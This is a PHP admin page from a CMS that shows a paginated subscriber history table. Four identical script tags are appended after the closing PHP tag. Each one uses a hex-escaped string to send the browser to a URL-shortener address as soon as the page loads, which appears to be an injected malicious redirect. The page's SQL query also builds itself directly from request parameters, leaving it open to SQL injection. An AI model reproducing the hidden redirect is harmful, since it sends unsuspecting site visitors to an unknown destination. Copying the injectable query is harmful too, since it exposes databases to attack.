<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
        $this->xajax->registerFunction("viewSubscriber");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

//echo "SELECT * FROM subscriber_history WHERE SUBSCRIBER_ID='$_REQUEST[id]' ORDER BY HISTORY_ID DESC";
$classRecord = $objMisc->getAllRecordsPagingNew("SELECT * FROM subscriber_history WHERE SUBSCRIPTION_ID='$_REQUEST[id]' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY HISTORY_ID DESC");
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<thead><tr><th>Subscriber</th><th>Comment</th><th>Date</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$objMisc->GiveValue("SUBSCRIBER_ID='$rowRec[subscriber_id]'",'`NAME`','subscribers').'<br>'.$objMisc->GiveValue("SUBSCRIBER_ID='$rowRec[subscriber_id]'",'`MSO_ID`','subscribers').'<br>'.$objMisc->GiveValue("SUBSCRIBER_ID='$rowRec[subscriber_id]'",'`ADDRESS`','subscribers').'</td>';
            $pagin_recs .='<td>'.((!empty($rowRec['remarks']))?$rowRec['remarks']:'Issued').'</td>';
            $pagin_recs .='<td>'.date('d M,Y',strtotime($rowRec['added_time'])).'</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="6">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="6" align="center">No Record Found</td></tr></tbody>';
    }
    

$smartyVars['stbNo']                =   $_REQUEST['name'];
$smartyVars['page']                 =   $_REQUEST['page'];
$smartyVars['classData']                 = $pagin_recs;
$objMisc->displayPage("header,stb-log,footer",$smartyVars);

?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>